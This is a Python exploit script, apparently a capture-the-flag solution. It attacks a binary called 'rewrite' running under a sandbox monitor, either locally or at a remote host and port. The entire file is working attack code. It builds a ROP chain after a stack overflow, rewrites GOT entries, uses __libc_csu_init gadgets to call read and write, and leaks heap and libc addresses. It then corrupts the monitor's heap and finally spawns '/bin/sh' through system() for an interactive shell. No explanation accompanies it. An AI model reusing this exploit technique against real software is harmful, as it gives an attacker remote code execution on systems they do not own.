#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

monitor  = './mvees'
bin_file = './rewrite'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[monitor, bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.select()

#==========

binf = ELF(bin_file)
addr_got_stackfail  = binf.got['__stack_chk_fail']
addr_got_read       = binf.got['read']
addr_plt_read       = binf.plt['read']
addr_bss            = binf.sep_section['.bss']

addr_main           = binf.sep_function['main']
addr_getlong        = binf.sep_function['getlong']
addr_csuinit        = binf.sep_function['__libc_csu_init']

addr_stack          = addr_bss + 0xc00
addr_ptr_read       = addr_bss + 0x100

monf = ELF(monitor)
addr_mon_got_free   = monf.got['free']

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    rop = ROP(binf)

    exploit  = 'yes'
    exploit += '\x00'*(0x20-len(exploit))
    exploit += p64(addr_stack-0x8)

    # read(STDIN_FILENO, addr_stack, XXXXXXXX)
    exploit += p64(rop.rdi.address)
    exploit += p64(constants.STDIN_FILENO)
    exploit += p64(rop.rsi_r15.address)
    exploit += p64(addr_stack)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_plt_read)
    exploit += p64(rop.leave.address)

    conn.sendafter('>> ', exploit[:-1])

    conn.sendafter('addr : ', str(addr_got_stackfail))
    conn.sendafter('value : ', str(rop.leave.address))

    # read(STDIN_FILENO, addr_ptr_read, XXXXXXXX)
    exploit  = p64(rop.rsi_r15.address)
    exploit += p64(addr_ptr_read)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_plt_read)

    # read(STDIN_FILENO, addr_got_read, 1)
    exploit += call(addr_got_read, constants.STDIN_FILENO, addr_got_read, 0x1)                  # read

    # write(STDOUT_FILENO, addr_bss, 0x10)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, addr_bss, 0x10)                     # write

    # write(STDOUT_FILENO, 0xcafebabe, 0xffffffffffffffff)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, 0xcafebabe, 0xffffffffffffffff)     # write

    # read(STDIN_FILENO, addr_stack, 0x50)
    exploit += call(addr_ptr_read, constants.STDIN_FILENO, addr_stack+len(exploit)+0x40, 0x200) # read

    waitsend(conn, exploit)

    waitsend(conn, p64(addr_plt_read + 6))
    waitsend(conn, '\x80')

    conn.read(0x10)
    if not env.check('debug'):
        leak = conn.read(0x60)
        addr_heap_base      = u64(leak[0x0:0x8]) - 0x310
        info('addr_heap   = 0x{:08x}'.format(addr_heap_base))

        addr_libc_mainarena = u64(leak[0x10:0x18]) - 0x58
        libc.address        = addr_libc_mainarena - offset_libc_mainarena
        info('addr_libc   = 0x{:08x}'.format(libc.address))
        addr_libc_system    = libc.sep_function['system']

        while True:
            if not conn.read(timeout = 0.5):
                break
    else:
        addr_heap_base = 0x603000

    # read(STDIN_FILENO, addr_got_read, 1)
    exploit  = call(addr_got_read, constants.STDIN_FILENO, addr_got_read, 0x1)                  # read

    # write(STDOUT_FILENO, addr_bss, 0x10)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, addr_bss, 0x10)                     # write

    # read(STDIN_FILENO, 0xcafebabe, 0xffffffffffffffff)
    exploit += call(addr_ptr_read, constants.STDIN_FILENO, 0xcafebabe, 0xffffffffffffffff)      # read

    # read(STDIN_FILENO, 0xcafebabe, XXXX)
    exploit += call(addr_got_read, constants.STDIN_FILENO, 0xcafebabe, (addr_mon_got_free & ~0xf) - (addr_heap_base+0x350) - 0x20)

    # read(STDIN_FILENO, addr_bss, 0x40)
    exploit += call(addr_got_read, constants.STDIN_FILENO, addr_bss, 0x40)                      # read

    waitsend(conn, exploit)

    waitsend(conn, '\x80')
    conn.read(0x20)
    if not env.check('debug'):
        waitsend(conn, 'a'*0x18+p64(0xfffffffffffffff1))
        waitsend(conn, p64(0xdeadbeef))
    waitsend(conn, '/bin/sh\x00'+p64(addr_libc_system))

def call(func_ptr, rdi, rsi, rdx):
    if rdx<0:
        rdx += 0x10000000000000000

    exploit  = p64(addr_csuinit + 0x5a)
    exploit += p64(0)
    exploit += p64(1)
    exploit += p64(func_ptr)               # read
    exploit += p64(rdx)
    exploit += p64(rsi)
    exploit += p64(rdi)
    exploit += p64(addr_csuinit + 0x40)

    return exploit

def waitsend(conn, s):
    sleep(0.01)
    conn.send(s)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
